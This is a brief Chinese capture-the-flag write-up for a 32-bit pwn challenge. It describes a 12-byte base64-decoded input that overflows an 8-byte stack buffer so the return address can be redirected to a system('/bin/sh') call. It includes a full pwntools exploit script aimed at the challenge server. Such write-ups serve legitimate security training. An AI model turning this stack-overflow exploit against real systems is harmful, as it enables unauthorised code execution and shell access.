# 挑战简介
还是那句话，理清逻辑很重要

# 思路
我们要理清这个题的逻辑

首先接收你的不超过0x30的数据，进行base64解码后，将解码后的数据长度与0xc做对比，也就是解码数据不超过12字节，在之后进入auth函数，会将input里面的数据复制进v4

突破点就在v4的栈空间大小，默认对比的长度是12字节，说明我们可以输入的字节为12，而v4的栈空间仅仅有8字节，所以我们顺便可以覆盖ret，返回到我们执行system-binsh的地址即可

```
from pwn import *
import base64
context(arch="i386", log_level="debug")

p = remote("pwn.challenge.ctf.show",28300)
elf = ELF('D:\edge 下载\pwn')

inpput = 0x0811EB40

system = 0x08049284

payload1 = b'a'*4 + p32(system) + p32(inpput)
 
payload1 = base64.b64encode(payload1)

p.sendline(payload1)

p.interactive()
```
